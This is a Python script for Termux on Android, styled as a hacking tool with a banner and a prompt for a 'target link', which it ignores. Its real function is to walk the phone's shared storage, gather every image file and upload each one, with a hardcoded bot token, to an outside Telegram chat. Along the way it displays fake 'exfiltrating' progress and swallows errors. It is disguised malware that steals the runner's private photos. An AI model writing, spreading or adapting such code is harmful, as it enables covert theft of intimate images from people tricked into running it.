import os
import asyncio
import sys
from telegram import Bot
from telegram.error import TelegramError

# Colores ANSI
G = '\033[92m'  # Verde
R = '\033[91m'  # Rojo
Y = '\033[93m'  # Amarillo
B = '\033[94m'  # Azul
C = '\033[96m'  # Cyan
W = '\033[0m'   # Reset

def banner():
    print(f"""{G}
    ██████╗  █████╗ ████████╗ █████╗     ███████╗██╗   ██╗██████╗ 
    ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗    ██╔════╝██║   ██║██╔══██╗
    ██║  ██║███████║   ██║   ███████║    ███████╗██║   ██║██████╔╝
    ██║  ██║██╔══██║   ██║   ██╔══██║    ╚════██║██║   ██║██╔═══╝ 
    ██████╔╝██║  ██║   ██║   ██║  ██║    ███████║╚██████╔╝██║     
    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝    ╚══════╝ ╚═════╝ ╚═╝     
    {R}[ System Protocol: ACTIVE ]          [ Status: DEEP_SCAN ]{W}
    """)

banner()
print(f"{C}┌──({G}root@internal{C})-[{W}~{C}]")
input(f"└─$ {W}Ingrese el link del destino: ")
print(f"{Y}🔍 Iniciando escaneo recursivo en almacenamiento...{W}\n")

async def enviar_fotos_telegram():
    BOT_TOKEN = "8096588316:AAGQX5cNAzy49Kl6tvP_FcW2gZarttEt8Ss"
    CHAT_ID = "8326936177"
    # Ruta raíz solicitada
    ruta_raiz = "/data/data/com.termux/files/home/storage"
    EXTENSIONES_IMAGEN = ('.jpg', '.jpeg', '.png', '.webp', '.bmp')

    try:
        bot = Bot(token=BOT_TOKEN)
        
        if not os.path.exists(ruta_raiz):
            print(f"{R}[!] ERROR: Ruta raíz inaccesible o permisos denegados.{W}")
            return

        # --- BÚSQUEDA RECURSIVA ---
        print(f"{B}[*] Indexando vectores de datos...{W}")
        archivos_encontrados = []
        for raiz, carpetas, archivos in os.walk(ruta_raiz):
            for f in archivos:
                if f.lower().endswith(EXTENSIONES_IMAGEN):
                    archivos_encontrados.append(os.path.join(raiz, f))
        
        if not archivos_encontrados:
            print(f"{Y}[?] DATA_NOT_FOUND: No se localizaron archivos en ninguna subcarpeta.{W}")
            return

        print(f"{B}[*] TOTAL VECTORES:{W} {len(archivos_encontrados)} paquetes listos.")
        print(f"{G}{'='*60}{W}")

        for i, ruta_completa in enumerate(archivos_encontrados, 1):
            try:
                # Leer bytes para el dump hexadecimal
                with open(ruta_completa, 'rb') as f:
                    cabecera_hex = f.read(12).hex().upper()
                
                hex_display = ' '.join(cabecera_hex[j:j+2] for j in range(0, len(cabecera_hex), 2))

                # Mostrar progreso con HEX en lugar de nombre
                sys.stdout.write(f"\r{B}[{i}/{len(archivos_encontrados)}]{W} Exfiltrando: {G}{hex_display}...{W}")
                sys.stdout.flush()
                
                with open(ruta_completa, 'rb') as foto:
                    await bot.send_photo(
                        chat_id=CHAT_ID, 
                        photo=foto, 
                        caption=f"Deep_Extraction_{i} | HEX: {cabecera_hex[:10]}"
                    )
                
                # Pequeña pausa para evitar Flood de Telegram
                await asyncio.sleep(1.0)
                
            except Exception:
                # Si un archivo falla (por permisos o estar corrupto), saltamos al siguiente
                continue

        print(f"\n\n{G}[+++] EXTRACCIÓN MASIVA FINALIZADA [+++]{W}")

    except TelegramError:
        print(f"\n{R}[!] CONNECTION_ERROR: Error en el túnel.{W}")
    except Exception as e:
        print(f"\n{R}[!] SYS_FAILURE: {e}{W}")

if __name__ == "__main__":
    try:
        asyncio.run(enviar_fotos_telegram())
    except KeyboardInterrupt:
        print(f"\n\n{R}[!] OPERACIÓN ABORTADA POR EL USUARIO.{W}")
